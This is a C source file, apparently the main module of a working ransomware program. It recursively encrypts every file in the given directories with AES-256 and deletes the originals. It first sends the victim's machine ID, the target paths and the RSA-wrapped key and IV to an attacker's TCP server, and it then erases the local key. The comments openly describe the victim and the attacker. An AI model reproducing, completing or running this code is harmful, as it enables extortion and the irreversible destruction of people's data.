#include <dirent.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include "evp/evp.h"
#include "option/option.h"
#include "../lib/parser/argument.h"
#include "../lib/parser/argument_parser.h"
#include "../lib/parser/argument_parser_error.h"
#include "../lib/tcp/tcp.h"
#include "../lib/util/tool.h"

#define PUBLIC_KEY "-----BEGIN PUBLIC KEY-----\n"                    \
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2bc224xWgt6LfH0eIUM3\n" \
"ocU9UHjIhMn12faXSiG/BUHbEUfu1HxtW1We6etDGy4Lw5P49CMR3VRvRwunx8ri\n" \
"144GVsRQqD1bt48lNqKtHpRbaMvCWqOoHz3aoSG3ELmrjFdupJv0k0jVK3JEaMKJ\n" \
"oeMwgcVisS8ezvV4OGVY/P8dhF97epl3ODBNOhhFjIpiamN5MDxmFcS8bG2jnRS5\n" \
"i3MVyIj72lyAArMuAbfVykfcJVdZupjJXJ7kzrZg9iV7MJ1Lm9xflsRaVrtjbBBL\n" \
"DXoxVh6M2/3sZoXeNrQwrlHeiIfijkTXEUBUQZzY6/ObQF/j9pXTHu9qUtHc0LL+\n" \
"QQIDAQAB\n"                                                         \
"-----END PUBLIC KEY-----\n"

bool sendInformation(const int *client_socked_id, const char *machine_id, const char *directory, const char *key,
                     const char *iv, const unsigned short int *estimated_buffer_size);

/**
 * Send the machine ID, paths, key and iv to the attacker.
 * @param key_set `KeySet` containing the key and the iv (const KeySet *)
 * @param directories Path of the directories to encrypt (const char **)
 * @param directories_size Number of directories' path to send (const unsigned short int *)
 * @return Success of sending all information (bool)
 */
bool sendAllInformation(const char *ip, const int port, const KeySet *key_set, const char **directories,
                        const unsigned short int *directories_size) {
    int client_socked_id;

    if ((client_socked_id = newSocketId()) == -1) {
        fputs("Failed to create the socketID.\n", stderr);
        return false;
    }

    SocketAddress server_address = newSocketAddress(ip, port);

    const unsigned short int max_try = 3;
    unsigned short int try = 0;

    while (!connectClient(&client_socked_id, &server_address)) {
        try++;

        if (try < max_try) {
            fprintf(stdout, "[%d/%d] attempt: Failed to connect to server...\n"
                            "Retrying in 5 seconds\n", try, max_try);
            sleep(5);
        } else {
            fprintf(stdout, "[%d/%d] attempt: Failed to connect to the server...\n", try, max_try);
            break;
        }
    }

    if (try == max_try) {
        fputs("\nThe server is unreachable.\n", stderr);
        closeSocketAddress(&client_socked_id);
        return false;
    }

    char *machine_id = getMachineID();

    if (machine_id == NULL) {
        fputs("Failed to get the machine id.\n", stderr);
        closeSocketAddress(&client_socked_id);
        return false;
    }

    RSA *rsa = newRSA(PUBLIC_KEY, true);

    if (rsa == NULL) {
        fputs("Failed to create the RSA structure.\n", stderr);
        closeSocketAddress(&client_socked_id);
        free(machine_id);
        return false;
    }

    KeySet *encrypted_key_set = newEncryptedKeySet(key_set, rsa, true);

    if (encrypted_key_set == NULL) {
        fputs("Failed to encrypt the KeySet.\n", stderr);
        closeSocketAddress(&client_socked_id);
        free(machine_id);
        freeRSA(rsa);
        return false;
    }

    freeRSA(rsa);

    char *key = byteToHex(encrypted_key_set->key, RSA_ENCRYPTION_SIZE);
    char *iv = byteToHex(encrypted_key_set->iv, RSA_ENCRYPTION_SIZE);

    free_key_set_macro(encrypted_key_set);

    if (key == NULL || iv == NULL) {
        fputs("Failed to parse the key-iv.\n", stderr);

        closeSocketAddress(&client_socked_id);

        free(machine_id);
        free(key);
        free(iv);

        return false;
    }

    const unsigned short int estimated_buffer_size = MACHINE_ID_SIZE + (2 * (2 * RSA_ENCRYPTION_SIZE)) + 4;

    for (unsigned short int i = 0; i < *directories_size; i++) {
        if (!sendInformation(&client_socked_id, machine_id, directories[i], key, iv, &estimated_buffer_size)) {
            fputs("Failed to send the information.\n", stderr);

            closeSocketAddress(&client_socked_id);

            free(machine_id);
            free(key);
            free(iv);

            return false;
        }

        if (i < *directories_size - 1)
            // Ensure that the server doesn't receive everything at once.
            sleep(1);
    }

    closeSocketAddress(&client_socked_id);

    free(machine_id);
    free(key);
    free(iv);

    return true;
}

/**
 * Send the machine ID, path and encrypted key / iv to the attacker.
 * @param client_socked_id Socket ID connected to the attacker (const int *)
 * @param machine_id Machine ID of the victim (const char *)
 * @param directory Path of the directory that will be encrypted (const char *)
 * @param key Encrypted key (const char *)
 * @param iv Encrypted iv (const char *)
 * @param estimated_buffer_size Estimated buffer size (without the directory path) (const unsigned short int *)
 * @return Success of sending the information (bool)
 */
bool sendInformation(const int *client_socked_id, const char *machine_id, const char *directory, const char *key,
                     const char *iv, const unsigned short int *estimated_buffer_size) {
    const size_t buffer_size = *estimated_buffer_size + strlen(directory);

    char *buffer = (char *) malloc(buffer_size * sizeof(char));

    if (buffer == NULL)
        return false;

    snprintf(buffer, buffer_size, "%s %s %s %s", machine_id, directory, key, iv);

    const ssize_t size_sent = sendData(client_socked_id, buffer, buffer_size);

    free(buffer);

    if (size_sent != buffer_size)
        return false;

    return true;
}

#pragma clang diagnostic push
#pragma ide diagnostic ignored "misc-no-recursion"

/**
 * Ransomware function.
 * @param path Working directory path (const char *)
 * @param key_set `KeySet` containing the key and the iv (const KeySet *)
 * @param task Current `EvpTask` (Encrypt or  Decrypt) (const EvpTask *)
 * @param f_EVP_Init_ex EVP init function for the current `EvpTask` (int (f)(EVP_CIPHER_CTX *ctx, const EVP_CIPHER *cipher, ENGINE *impl, const unsigned char *key, const unsigned char *iv))
 * @param f_EVP_Update EVP update function for the current `EvpTask` (int (f)(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl))
 * @param f_EVP_Final_ex EVP final function for the current `EvpTask` (int (f_EVP_Final_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl))
 * @param buffer_reader_size Size to use for the buffer reader (const EvpBufferSize *)
 * @param buffer_writer_size Size to use for the buffer writer (const EvpBufferSize *)
 */
void ransomware(const char *path, const KeySet *key_set, const EvpTask *task,
                int (f_EVP_Init_ex)(EVP_CIPHER_CTX *ctx,
                                    const EVP_CIPHER *cipher, ENGINE *impl,
                                    const unsigned char *key,
                                    const unsigned char *iv),
                int (f_EVP_Update)(EVP_CIPHER_CTX *ctx, unsigned char *out,
                                   int *outl, const unsigned char *in, int inl),
                int (f_EVP_Final_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm,
                                     int *outl),
                const EvpBufferSize *buffer_reader_size, const EvpBufferSize *buffer_writer_size) {
    DIR *dir;
    const struct dirent *entry;

    // Make sure that errno is set to 0.
    errno = 0;

    if ((dir = opendir(path)) == NULL) {
        fprintf(stderr, "Failed to open the directory %s\n", path);
        return;
    }

    // Continue the loop even if a file / directory cannot be represented correctly in the structure.
    while (errno == EOVERFLOW || (entry = readdir(dir)) != NULL) {
        // Skip the corrupted structure, reset errno and continue the loop.
        if (errno == EOVERFLOW) {
            fprintf(stderr, "Corrupted structure detected while browsing the directory %s\n", path);
            errno = 0;
            continue;
        }

        const bool is_dir = entry->d_type == DT_DIR;
        const char *name = entry->d_name;

        // Skip directories "." && ".."
        if (is_dir && (strcmp(".", name) == 0 || strcmp("..", name) == 0))
            continue;

        // size = path + '/' + name + '\0'
        const unsigned short int path_built_size = strlen(path) + 1 + strlen(name) + 1;
        char *path_built = (char *) malloc(path_built_size * sizeof(char));

        if (path_built == NULL) {
            fputs("Cannot allocate the buffer in locateFiles.\n", stderr);
            closedir(dir);
            return;
        }

        snprintf(path_built, path_built_size, "%s/%s", path, name);

        if (is_dir)
            ransomware(path_built, key_set, task, f_EVP_Init_ex, f_EVP_Update, f_EVP_Final_ex, buffer_reader_size,
                       buffer_writer_size);
        else {
            if (process(path_built, task)) {
                char *out = getTaskPath(path_built, task);

                if (out == NULL) {
                    fputs("Cannot allocate the memory to build the output path file.\n", stderr);
                    free(path_built);
                    closedir(dir);
                    return;
                }

                if (evpTask(key_set, path_built, out, f_EVP_Init_ex, f_EVP_Update, f_EVP_Final_ex,
                            buffer_reader_size, buffer_writer_size))
                    remove(path_built);
                else {
                    remove(out);
                    fprintf(stderr, "Failed to %s the file %s\n", taskToString(task), path_built);
                }

                free(out);
            } else
                fprintf(stdout, "Skipping %s\n", path_built);
        }

        free(path_built);
    }

    closedir(dir);
}

#pragma clang diagnostic pop

int main(int argc, char *argv[]) {
    Argument *arguments = NULL;

    const unsigned short int arg_value_null[] = {HELP};
    const unsigned short int arg_once[] = {KEY, IV, IP, PORT};
    const unsigned short int arg_required[] = {DIRECTORY};

    const short int len = parseArguments(&arguments,
                                         &argc, argv,
                                         optionFromString,
                                         validateOption,
                                         arg_value_null, get_size_macro(arg_value_null),
                                         arg_once, get_size_macro(arg_once),
                                         arg_required, get_size_macro(arg_required));

    if (len <= -1) {
        const ArgumentParserError error = (const ArgumentParserError) len;
        displayParseArgumentErrorMeaning(argv, arguments, &error, optionToString);
        fputs("Do --help for more information.\n", stdout);
        free(arguments);
        return EXIT_FAILURE;
    }

    bool is_help = false;

    const char *ip = NULL;
    int port = 0;

    const char **directories = NULL;
    unsigned short int directories_size = 0;

    const char *key = NULL;
    const char *iv = NULL;

    EvpBufferSize buffer_reader_size;
    EvpBufferSize buffer_writer_size;

    // Place the arguments in their respective variable.
    for (unsigned short int i = 0; i < len; i++) {
        const Argument *argument = &arguments[i];

        switch ((Option) argument->option) {
            case HELP:
                is_help = true;
                break;
            case DIRECTORY:
                directories_size++;
                directories = (const char **) realloc(directories, directories_size * sizeof(const char *));

                if (directories == NULL) {
                    fputs("Failed to allocate the directories.\n", stderr);
                    free(arguments);
                    return EXIT_FAILURE;
                }

                directories[directories_size - 1] = argument->value;
                break;
            case KEY:
                key = argument->value;
                break;
            case IV:
                iv = argument->value;
                break;
            case IP:
                ip = argument->value;
                break;
            case PORT:
                // atoi is safe here because the value has been validated.
                port = atoi(argument->value);

                if (port == 0) {
                    fprintf(stderr, "Failed to convert the port to an integer value.\n"
                                    "Using default PORT for the server: %d\n", TCP_SERVER_PORT);
                    port = TCP_SERVER_PORT;
                }
                break;
        }
    }

    // No longer need of arguments.
    free(arguments);

    if (is_help) {
        help();
        return EXIT_SUCCESS;
    }

    EvpTask task = key != NULL || iv != NULL ? Evp_DECRYPT : Evp_ENCRYPT;

    if (task == Evp_DECRYPT && (key == NULL || iv == NULL)) {
        free(directories);
        fputs("The key and the iv are both required to decrypt.\n", stderr);
        return EXIT_FAILURE;
    }

    KeySet *key_set = newEmptyKeySet(AES_256_KEY_SIZE, AES_BLOCK_SIZE);

    if (key_set == NULL) {
        free(directories);
        fputs("Failed to allocate the KeySet.\n", stderr);
        return EXIT_FAILURE;
    }

    if (task == Evp_ENCRYPT) {
        if (!generateKeySet(key_set)) {
            fputs("Failed to generate the KeySet.\n", stderr);
            free_key_set_macro(key_set);
            free(directories);
            return EXIT_FAILURE;
        }

        if (ip == NULL) {
            fprintf(stdout, "Using default IP for the server: %s\n", TCP_SERVER_IP);
            ip = TCP_SERVER_IP;
        }

        if (port == 0) {
            fprintf(stdout, "Using default PORT for the server: %d\n", TCP_SERVER_PORT);
            port = TCP_SERVER_PORT;
        }

        if (!sendAllInformation(ip, port, key_set, directories, &directories_size)) {
            free_key_set_macro(key_set);
            free(directories);
            return EXIT_FAILURE;
        }

        buffer_reader_size = DEFAULT_BUFFER_SIZE;
        buffer_writer_size = PADDING_BUFFER_SIZE;

        for (unsigned short int i = 0; i < directories_size; i++)
            ransomware(directories[i], key_set, &task, EVP_EncryptInit_ex, EVP_EncryptUpdate, EVP_EncryptFinal_ex,
                       &buffer_reader_size, &buffer_writer_size);
    } else {
        unsigned char *key_byte = hexToByte(key);
        unsigned char *iv_byte = hexToByte(iv);

        if (key_byte == NULL || iv_byte == NULL) {
            fputs("Failed to parse the key-iv.\n", stderr);
            free(key_byte);
            free(iv_byte);
            free_key_set_macro(key_set);
            free(directories);
            return EXIT_FAILURE;
        }

        parseKeySet(key_set, key_byte, AES_256_KEY_SIZE, iv_byte, AES_BLOCK_SIZE);

        free(key_byte);
        free(iv_byte);

        buffer_reader_size = PADDING_BUFFER_SIZE;
        buffer_writer_size = DEFAULT_BUFFER_SIZE;

        for (unsigned short int i = 0; i < directories_size; i++)
            ransomware(directories[i], key_set, &task, EVP_DecryptInit_ex, EVP_DecryptUpdate, EVP_DecryptFinal_ex,
                       &buffer_reader_size, &buffer_writer_size);
    }

    if (task == Evp_ENCRYPT) {
        eraseKeySet(key_set);
        if(!addPublicKey())
            fputs("Error while trying to add the public key.\n",stderr);
    }

    free_key_set_macro(key_set);

    free(directories);

    return EXIT_SUCCESS;
}
